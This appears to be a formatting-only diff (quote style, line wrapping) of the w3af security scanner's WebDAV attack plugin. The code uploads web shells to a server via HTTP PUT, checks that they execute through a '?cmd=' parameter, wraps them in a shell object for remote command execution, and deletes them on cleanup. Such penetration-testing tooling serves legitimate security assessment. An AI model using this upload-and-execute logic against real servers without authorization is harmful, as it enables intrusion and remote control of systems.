@@ -19,6 +19,7 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 """
+
 import w3af.core.controllers.output_manager as om
 import w3af.plugins.attack.payloads.shell_handler as shell_handler
 
@@ -45,7 +46,7 @@ class dav(AttackPlugin):
         """
         :return: The type of exploit, SHELL, PROXY, etc.
         """
-        return 'shell'
+        return "shell"
 
     def get_kb_location(self):
         """
@@ -58,7 +59,7 @@ class dav(AttackPlugin):
         Then the exploit plugin that exploits os_commanding
         ( attack.os_commanding ) should return 'os_commanding' in this method.
         """
-        return ['dav']
+        return ["dav"]
 
     def _generate_shell(self, vuln_obj):
         """
@@ -69,8 +70,9 @@ class dav(AttackPlugin):
         # Check if we really can execute commands on the remote server
         if self._verify_vuln(vuln_obj):
             # Create the shell object
-            shell_obj = DAVShell(vuln_obj, self._uri_opener, self.worker_pool,
-                                 self._exploit_url)
+            shell_obj = DAVShell(
+                vuln_obj, self._uri_opener, self.worker_pool, self._exploit_url
+            )
             return shell_obj
         else:
             return None
@@ -89,38 +91,42 @@ class dav(AttackPlugin):
         shell_list = shell_handler.get_webshells(extension)
 
         for file_content, real_extension in shell_list:
-            if extension == '':
+            if extension == "":
                 extension = real_extension
             om.out.debug('Uploading shell with extension: "%s".' % extension)
 
             # Upload the shell
-            fname = '%s.%s' % (filename, extension)
+            fname = "%s.%s" % (filename, extension)
             url_to_upload = vuln_obj.get_url().url_join(fname)
 
-            om.out.debug('Uploading file %s using PUT method.' % url_to_upload)
+            om.out.debug("Uploading file %s using PUT method." % url_to_upload)
             self._uri_opener.PUT(url_to_upload, data=file_content)
 
             # Verify if I can execute commands
             # All w3af shells, when invoked with a blank command, return a
             # specific value in the response:
             # shell_handler.SHELL_IDENTIFIER
-            exploit_url = URL(url_to_upload + '?cmd=')
+            exploit_url = URL(url_to_upload + "?cmd=")
             response = self._uri_opener.GET(exploit_url)
 
             if shell_handler.SHELL_IDENTIFIER in response.get_body():
-                msg = ('The uploaded shell returned the SHELL_IDENTIFIER, which'
-                       ' verifies that the file was uploaded and is being'
-                       ' executed.')
+                msg = (
+                    "The uploaded shell returned the SHELL_IDENTIFIER, which"
+                    " verifies that the file was uploaded and is being"
+                    " executed."
+                )
                 om.out.debug(msg)
                 self._exploit_url = exploit_url
                 return True
             else:
-                msg = ('The uploaded shell with extension: "%s" did NOT return'
-                       ' the SHELL_IDENTIFIER, which means that the file was'
-                       ' not uploaded to the remote server or the code is not'
-                       ' being run. The returned body was: "%s".')
+                msg = (
+                    'The uploaded shell with extension: "%s" did NOT return'
+                    " the SHELL_IDENTIFIER, which means that the file was"
+                    " not uploaded to the remote server or the code is not"
+                    ' being run. The returned body was: "%s".'
+                )
                 om.out.debug(msg % (extension, response.get_body()))
-                extension = ''
+                extension = ""
 
     def get_root_probability(self):
         """
@@ -147,12 +153,12 @@ class dav(AttackPlugin):
 
 
 class DAVShell(ExecShell):
-    
+
     def __init__(self, vuln, uri_opener, worker_pool, exploit_url):
         super(DAVShell, self).__init__(vuln, uri_opener, worker_pool)
-        
+
         self.exploit_url = exploit_url
-    
+
     def execute(self, command):
         """
         This method executes a command in the remote operating system by
@@ -169,8 +175,7 @@ class DAVShell(ExecShell):
     def end(self):
         url_to_del = self.exploit_url.uri2url()
 
-        msg = 'DAVShell is going to delete the web shell that was uploaded' \
-              ' to %s.'
+        msg = "DAVShell is going to delete the web shell that was uploaded" " to %s."
         om.out.debug(msg % url_to_del)
 
         try:
@@ -178,10 +183,10 @@ class DAVShell(ExecShell):
         except BaseFrameworkException as e:
             om.out.error('DAVShell cleanup failed with exception: "%s".' % e)
         else:
-            om.out.debug('DAVShell cleanup complete, %s deleted.' % url_to_del)
+            om.out.debug("DAVShell cleanup complete, %s deleted." % url_to_del)
 
     def get_name(self):
-        return 'dav'
+        return "dav"
 
     def __reduce__(self):
         """
